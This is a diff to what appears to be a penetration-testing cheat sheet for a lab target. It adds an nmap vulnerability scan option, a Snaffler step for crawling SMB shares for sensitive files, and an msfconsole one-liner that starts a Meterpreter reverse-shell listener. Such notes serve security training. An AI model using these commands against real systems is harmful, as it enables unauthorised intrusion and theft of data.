@@ -11,7 +11,7 @@ Fast port discovery
 
 List all ports with possible vulnerabilities
 
-    $ nmap -p4386 -v -sS -sV --script vuln 10.10.10.178
+    $ nmap -A -p4386 -v -sS -sV --script vuln 10.10.10.178
 
 You can also use netcat to do port scanning
 
@@ -194,6 +194,11 @@ List contents of shares:
 Retrieve a folder recursively:
 
     smbget -R -U User smb://10.10.10.178/SHARE\$/XXX/
+
+Crawl SMB share
+
+    snaffler
+
 
 Display tree
     
@@ -401,6 +406,11 @@ Start wait:
     # msfconsole
     msf5 > use exploit/multi/handler 
     msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
+
+Or inline:
+
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {yourip}; set LPORT 9999; exploit -j"
+
 
 Put on the machine and run 
 
